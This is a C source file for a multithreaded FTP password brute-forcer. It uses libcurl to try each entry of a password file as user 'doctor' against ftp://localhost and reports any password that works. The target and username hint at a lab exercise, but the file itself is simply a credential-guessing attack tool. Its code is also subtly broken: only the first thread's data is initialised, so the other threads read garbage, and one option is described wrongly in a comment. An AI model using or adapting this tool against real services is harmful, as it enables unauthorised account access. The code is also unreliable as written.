#include <curl/curl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_PASSWORD_LENGTH 100
#define NUM_THREADS 5  // Number of threads to use for parallel processing

typedef struct {
    char username[MAX_PASSWORD_LENGTH];
    char **passwords;
    int num_passwords;
    int start_index;
} ThreadData;

void *attempt_login(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    CURL *curl = curl_easy_init();
    CURLcode res;
    char userpwd[MAX_PASSWORD_LENGTH + 10];  // Username:password format

    if (!curl) {
        fprintf(stderr, "Error initializing libcurl\n");
        pthread_exit(NULL);
    }

    // Set FTP server address and port
    curl_easy_setopt(curl, CURLOPT_URL, "ftp://localhost");

    // Disable directory listing
    curl_easy_setopt(curl, CURLOPT_FTPLISTONLY, 1L);

    // Set username
    curl_easy_setopt(curl, CURLOPT_USERNAME, data->username);

    // Set connection timeout
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT,
                     10L);  // Connection timeout in seconds

    // Loop through passwords starting from the thread's start index
    for (int i = data->start_index; i < data->num_passwords; i += NUM_THREADS) {
        // Construct the username:password string
        snprintf(userpwd, sizeof(userpwd), "%s:%s", data->username,
                 data->passwords[i]);

        // Set username:password
        curl_easy_setopt(curl, CURLOPT_USERPWD, userpwd);

        // Try to connect to the FTP server
        res = curl_easy_perform(curl);

        // Check if login was successful
        if (res == CURLE_OK) {
            printf("Successful login with password: %s\n", data->passwords[i]);
            break;
        } else {
            printf("Login failed with password: %s\n", data->passwords[i]);
        }
    }

    // Cleanup
    curl_easy_cleanup(curl);
    pthread_exit(NULL);
}

int main(void) {
    FILE *password_file;
    char **passwords = NULL;
    char password[MAX_PASSWORD_LENGTH];
    int num_passwords = 0;
    pthread_t threads[NUM_THREADS];
    ThreadData thread_data[NUM_THREADS];

    // Open the password file
    password_file = fopen("passwords.txt", "r");
    if (!password_file) {
        fprintf(stderr, "Error opening password file\n");
        return EXIT_FAILURE;
    }

    // Read passwords from the file
    while (fgets(password, MAX_PASSWORD_LENGTH, password_file) != NULL) {
        // Remove trailing newline character
        password[strcspn(password, "\n")] = '\0';
        // Allocate memory for a new password
        passwords = realloc(passwords, (num_passwords + 1) * sizeof(char *));
        if (!passwords) {
            fprintf(stderr, "Error allocating memory\n");
            fclose(password_file);
            return EXIT_FAILURE;
        }
        // Allocate memory for the password string
        passwords[num_passwords] =
            malloc((strlen(password) + 1) * sizeof(char));
        if (!passwords[num_passwords]) {
            fprintf(stderr, "Error allocating memory\n");
            fclose(password_file);
            return EXIT_FAILURE;
        }
        // Copy the password into the allocated memory
        strcpy(passwords[num_passwords], password);
        num_passwords++;
    }

    // Close the password file
    fclose(password_file);

    // Set up thread data
    strcpy(thread_data[0].username, "doctor");
    thread_data[0].passwords = passwords;
    thread_data[0].num_passwords = num_passwords;

    // Create threads to attempt login
    for (int i = 0; i < NUM_THREADS; ++i) {
        thread_data[i].start_index = i;  // Assign start index to threads
        if (pthread_create(&threads[i], NULL, attempt_login,
                           (void *)&thread_data[i]) != 0) {
            fprintf(stderr, "Error creating thread\n");
            return EXIT_FAILURE;
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < NUM_THREADS; ++i) {
        pthread_join(threads[i], NULL);
    }

    // Free allocated memory
    for (int i = 0; i < num_passwords; ++i) {
        free(passwords[i]);
    }
    free(passwords);

    return EXIT_SUCCESS;
}
